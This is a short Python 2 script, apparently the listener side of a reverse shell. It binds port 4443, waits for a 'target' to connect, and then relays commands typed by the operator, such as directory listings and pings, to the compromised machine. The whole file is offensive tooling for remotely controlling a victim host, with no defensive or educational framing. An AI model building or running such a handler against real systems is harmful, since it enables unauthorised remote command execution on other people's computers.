from socket import *
import sys

HOST = ''
PORT = 4443

S = socket(AF_INET, SOCK_STREAM)
S.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
S.bind((HOST, PORT))

print "LISTENING ON 0.0.0.0:%s" % str(PORT)

S.listen(10)
(client, (ip, port)) = S.accept()

print "TARGET CONNECTED BY ", ip
shortcuts = {
    'p': 'ping -c 3 google.com',
    'l': 'ls al',
}

while True:
    data = client.recv(1024)

    cmd = raw_input(data)

    if cmd == 'quit' or cmd == 'q':
        break

    if cmd == 'exit':
        break

    new_cmd = shortcuts.get(cmd, cmd)
    #print(new_cmd)
    if new_cmd:
        client.sendall('{}\n'.format(new_cmd).encode('utf-8'))
    else:
        continue
client.close()
